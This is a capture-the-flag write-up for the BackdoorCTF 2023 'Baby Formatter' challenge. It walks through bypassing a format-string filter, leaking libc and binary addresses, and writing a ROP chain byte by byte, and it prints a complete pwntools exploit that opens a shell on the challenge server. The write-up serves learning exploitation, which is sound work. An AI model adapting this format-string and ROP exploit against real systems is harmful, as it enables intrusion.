---
title: Baby Formatter
date: 2023-12-19 15:41:00 + 0530
categories: [writeup, pwn]
tags: [BackdoorCTF2023]     # TAG names should always be lowercase
---

This challenge was super interesting and difficult for me, however due to lack of time, I couldn't solve it during the competition. Luckily their server was running afterwards so I pwned it a day later.

## The Challenge

> Just another format string challenge. Aren't they too easy these days :)
> 
> https://staticbckdr.infoseciitr.in/babyformatter.zip
> 
> nc 34.70.212.151 8003

## The Solution

On unzipping we have the following files:
```
challenge
ld-linux-x86-64.so.2
libc.so.6
```

The first thing to do is run `pwninit` so that it patches the binary to use the provided `libc` and `loader` instead of the default ones from our system, this is super helpful because after doing this we don't need to create separate exploits for local and remote environments. After that's done we can replace `challenge_patch` with `challenge` for convenience.

Upon initial inspection it seems to provide us with a menu and 3 options
1. Accept you are noob *( leaks 2 memory addresses )*
2. Try the challenge *( gives us another prompt where we find the fmt vuln )*
3. Exit *( simply exits )*

On further reversing and playing around we find that:
- The two values leaked via [1] are from the stack and libc ( fgets address ) respectively
- In [2], before our fmt vuln occurs, our input is passed to a filter() function where it checks for presence of the following chars in our input : `p`, `u`, `d`, `x`. If any one of them is present, the functions exits right away and `printf(foo)` is not called.

Obviously they have attempted to filter out some of the important format specifier, but quite a lot of them are still allowed.
> According to the man page of printf, `%#lX` can be used instead of `%p`. Also `%n` is still allowed, which enables us to do an arbitrary memory write.
{: .prompt-tip }

At this point, since we have a fair understanding of the program, it's a good time to run `checksec` to see which attacks are feasible
```console
$ checksec challenge
[*] '/home/vulnx/Games/CTFs/BackdoorCTF/pwn/Baby Formatter/challenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
$
```
I was going to opt for `GOT` overwriting but since `RELRO` is fully enabled, `GOT` won't be writable, so we have to think of something else. Since `NX` is enabled, stack won't be executable hence placing the shellcode on stack and redirecting `RIP` to it won't be of any help. This leaves us with `Return Oriented Programming (ROP)`.

So finally here's how I pwned this challenge<br>
We prepare the following ROP chain
- `ret`  *( to fix stack misalignment )*
- `pop rdi ; ret`
- `pointer to "/bin/sh"`
- `system()`

We do this by using the libc leak to calculate it's base address at runtime ( defeating `ASLR` ) and subsequently use that to calculate the addresses of the above gadgets. Once we have the necessary data to prepare the payload, we write it `byte-by-byte` **after** the saved return pointer of vuln() function ( called when [2] is choosen ). This is done deliberated so that `RIP` returns back to `main` and again we go to `vuln` to write another byte. Hence we cannot overwrite the ret pointer until the entire ROP chain is written on the stack. The location where ROP chain starts can also be determined at runtime by using the stack leak.

I assumed that the `filter` will block `pwntools` `fmtstr_payload` *( but it turns that we could have used that )* so I used the manual method :D

A fuzzer like this can be used to not only leak values for analysis but also determine where our input lies:
```python
from pwn import *

p = process('./challenge')
no_of_leaks = 20

def generate_payload(i):
    end = 'AAAABBBB'
    string = ''.join( '%{:02d}$#lX'.format(i) )
    string += '*' * ( 28 - len(string) - len(end) )
    string += end
    return string.encode()

for i in range(1, no_of_leaks):
    payload = generate_payload(i)
    print('Sending payload : {}.....'.format(payload), end='')
    p.sendline(b'2')
    p.sendlineafter(b'>> ', payload)
    output = p.clean()
    for line in output.split(b'\n'):
        if b'AAAABBBB' in line:
            print(line.split(b'*')[0])

p.close()
```
{: file="fuzzer.py"}

```console
$ python fuzzer.py
[+] Starting local process './challenge': pid 3744238
Sending payload : b'%01$#lX*************AAAABBBB'.....b'>> 0X78'
Sending payload : b'%02$#lX*************AAAABBBB'.....b'0XFBAD208B'
Sending payload : b'%03$#lX*************AAAABBBB'.....b'0X7FBCBD3145F2'
Sending payload : b'%04$#lX*************AAAABBBB'.....b'0'
Sending payload : b'%05$#lX*************AAAABBBB'.....b'0'
Sending payload : b'%06$#lX*************AAAABBBB'.....b'0X2A586C2324363025'
Sending payload : b'%07$#lX*************AAAABBBB'.....b'0X2A2A2A2A2A2A2A2A'
Sending payload : b'%08$#lX*************AAAABBBB'.....b'0X414141412A2A2A2A'
Sending payload : b'%09$#lX*************AAAABBBB'.....b'0X42424242'
Sending payload : b'%10$#lX*************AAAABBBB'.....b'0X5578359BDD80'
Sending payload : b'%11$#lX*************AAAABBBB'.....b'0X92C78EE688CCF300'
Sending payload : b'%12$#lX*************AAAABBBB'.....b'0X7FFDEFEA4930'
Sending payload : b'%13$#lX*************AAAABBBB'.....b'0X5578359BB4D1'
Sending payload : b'%14$#lX*************AAAABBBB'.....b'0X200001000'
Sending payload : b'%15$#lX*************AAAABBBB'.....b'0X92C78EE688CCF300'
Sending payload : b'%16$#lX*************AAAABBBB'.....b'0X1'
Sending payload : b'%17$#lX*************AAAABBBB'.....b'0X7FBCBD229D90'
Sending payload : b'%18$#lX*************AAAABBBB'.....b'0'
Sending payload : b'%19$#lX*************AAAABBBB'.....b'0X5578359BB462'
[*] Stopped process './challenge' (pid 3744238)
```

Clearly our desired 8 bytes are located at 8th argument, but since it's not aligned perfectly, the following changes can be made in the fuzzer:
```py
...
def generate_payload(i):
    end = 'AAAABBBB'
    end += '****'
    string = ''.join( '%{:02d}$#lX'.format(i) )
...
```

```console
$ python fuzzer.py
[+] Starting local process './challenge': pid 4060707
...
Sending payload : b'%08$#lX*********AAAABBBB****'.....b'0X4242424241414141'
...
[*] Stopped process './challenge' (pid 4060707)
```

Much better. Now I write an exploit script but it fails because of the following two reason:
1. Despite the ROP chain being on stack, the `RIP` simply returns to `main+111` and back to `vuln`, so practically it never reaches our payload.
2. Due to some reason after every `printf` call in `vuln` 0x00000002 was being overwritten to the higher nibble of the first gadget ( just below return pointer ). This meant that by the time the entire ROP chain is written on the stack, it is already corrupted.

To fix this I write the ROP chain further 8 bytes down. So the scene is something like this:
```
+----------------------+ <-- SAVED RET POINTER
|  SAVED RET POINTER   |
|----------------------| <-- (SAVED RET POINTER) + 8
| 0X00000002 overwrite |
|----------------------| <-- (SAVED RET POINTER) + 16
|    ROP starts here   |
|          ...         |
```

This solves problem 2 however problem 1 still persists. To solve that I decided to further complicate it by leaking another value from the program. This one is `%13$#lX`, this is actually from the binary itself and can be used to calculate the base address of our binary as runtime ( defeating `PIE` ). The reason for doing so is that, now we have access to not only gadgets from libc but from the original binary itself. It gets important because of what we are about to do next. We use tools like `ROPgadget` to search for a specific gadget *( will be explained later )*.
```console
$ ROPgadget --binary challenge | grep ": pop .* ; ret$"
0x0000000000001223 : pop rbp ; ret
```

Since this gadget is from the binary itself, the difference between memory addresses of `main+111` and this gadget is just of two LSB, which we can overwrite in one go. To summarize, here's our new strategy:
1. Leak values from [1] and `%13$#lX` and calculate libc base, binary base
2. Prepare the ROP chain
3. Write the ROP chain byte-by-byte at (SAVED RET POINTER) + 16.
4. Do a partial overwrite at SAVED RET POINTER with 2 LSB of `pop rbp ; ret` gadget from binary.

Now let's discuss the significance of `pop * ; ret`. Since our shellcode is below the current return pointer, it would practically never be executed unless we `ret` into it. However, simply calling `ret` would return into (SAVED RET POINTER) + 8, where the overwritten 0x00000002 lies. For obvious reasons that will crash the program and again our payload isn't executed. So we need to not only remove a value from the top of the stack but also return into next one. `pop rbp ; ret` serves as the perfect candidate here.
Once we overwrite SAVED RET POINTER our code execution will be redirected to `pop rbp`, that instruction will remove the value at the top of the stack ( which happens to be 0x00000002 ), the `RSP` now points to the start of our ROP chain. The subsequent `ret` instruction would just go about executing it.

So finally, here's the pwn script you have been waiting for
```py
from pwn import *

# [========== PWNTOOLS BOILERPLATE CODE ==========]
elf = ELF('./challenge')
context.binary = elf
context.log_level = 'Critical'
context(terminal=['tmux', 'split-window', '-h'])
libc = elf.libc
# p = elf.process()
p = remote('34.70.212.151', 8003)
libc = ELF('./libc.so.6')

# [========= PREPARE NECESSARY FUNCTIONS =========]
def arb_write_single(where, what):
    p.sendline(b'2')
    end = p64( where )
    end += b'****'
    payload = b''
    if what != 0:
        payload += ('%{}c'.format(what)).encode()
    payload += b'%8$hhn'
    payload += b'*' * (28 - len(payload) - len(end))
    payload += end
    p.sendafter(b'Enter input\n>> ', payload)
    p.recvuntil(b'3. Exit\n>> ')

def arb_write_double(where, what):
    p.sendline(b'2')
    end = p64( where )
    end += b'****'
    payload = b''
    if what != 0:
        payload += ('%{}c'.format(what)).encode()
    payload += b'%8$hn'
    payload += b'*' * (28 - len(payload) - len(end))
    payload += end
    p.sendafter(b'Enter input\n>> ', payload)

# [============== LEAK VIA OPTION 1 ==============]
p.sendlineafter(b'>> ', b'1')
p.recvuntil(b'0x')
stack_leak = int( p.recvuntil(b' ').strip(), 16 )
libc_leak = int( p.recvline().strip(), 16 )

# [=========== LEAK VIA 13TH 13TH ARG ============]
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'>> ', b'%13$#lX*********AAAABBBB****')
binary_leak = int( p.recvuntil(b'*').strip()[:-1], 16 )

# [============= CALCULATE BASE ADDR =============]
libc_base = libc_leak - libc.symbols['fgets']
binary_base = binary_leak - 0x14d1
saved_ret_pointer = stack_leak + 0x18
payload_start_location = saved_ret_pointer + 16
pop_rbp_ret = binary_base + 0x0000000000001223

# [=============== PREPARE PAYLOAD ===============]
rop = ROP(libc)
payload  = b''
payload += p64( libc_base + rop.find_gadget(['ret']).address )
payload += p64( libc_base + rop.find_gadget(['pop rdi', 'ret']).address )
payload += p64( libc_base + next(libc.search(b'/bin/sh\x00')) )
payload += p64( libc_base + libc.symbols['system'] )
print('Payload length : {} bytes'.format(len(payload)))

# [================ SEND PAYLOAD =================]
for i, c in enumerate(payload):
    arb_write_single(payload_start_location + i , c)
    print('Sending payload {:.2f}%...'.format( (i * 100) / (len(payload) - 1) ), end='\n' if i == len(payload) - 1 else '\r' )

# [============ OVERWRITE RET POINTER ============]
arb_write_double(saved_ret_pointer, pop_rbp_ret & 0xffff)

# [================= START SHELL =================]
p.clean()
p.interactive()
```
{: file="pwn.py"}

```console
> python pwn.py
[*] '/home/vulnx/Games/CTFs/BackdoorCTF/pwn/Baby Formatter/challenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
Payload length : 32 bytes
Sending payload 100.00%...
$ ls
chall
flag
ld-linux-x86-64.so.2
libc.so.6
$ cat flag
flag{F0rm47_5tr1ng5_4r3_7o0_3asy}
$
```

## FLAG

`flag{F0rm47_5tr1ng5_4r3_7o0_3asy`

